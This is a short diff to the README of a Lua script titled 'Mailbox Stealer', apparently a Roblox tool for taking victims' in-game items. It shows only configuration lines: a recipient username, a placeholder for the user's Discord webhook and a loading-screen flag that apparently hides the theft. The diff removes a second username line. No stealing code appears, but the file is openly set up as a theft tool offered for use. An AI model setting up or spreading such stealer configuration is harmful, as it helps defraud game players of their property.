@@ -1,7 +1,6 @@
 # Mailbox Stealer
 ```lua
 Username = "MonzzBlox"
-Username2 = "MonzzBlox"
 Webhook = "Put Your Webhook" -- Your Webhook Discord
 
 LoadingScreen = true
